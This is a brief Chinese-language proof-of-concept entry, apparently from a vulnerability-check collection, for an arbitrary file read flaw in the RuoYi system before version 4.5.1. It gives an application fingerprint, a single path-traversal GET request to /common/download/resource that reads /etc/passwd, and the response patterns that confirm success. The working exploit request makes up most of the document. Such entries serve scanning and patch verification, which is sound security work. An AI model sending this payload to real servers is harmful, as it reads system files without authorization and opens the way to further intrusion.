﻿# 若依RuoYi系统 任意文件读取

> 更新时间：2024-01-15

> 漏洞编号：

> 漏洞说明：漏洞影响：RuoYi<4.5.1 

> 漏洞特征：app.name="RuoYi 若依"

> 验证脚本：HTTP

```
GET /common/download/resource?resource=/profile/../../../../../../../etc/passwd  HTTP/1.1
```

> 响应代码特征：200

> 响应内容特征：^(?=.*?root)(?=.*?bin).*?$

> 上传文件定位：


> 验证文件来源：若依RuoYi系统 任意文件读取.poc
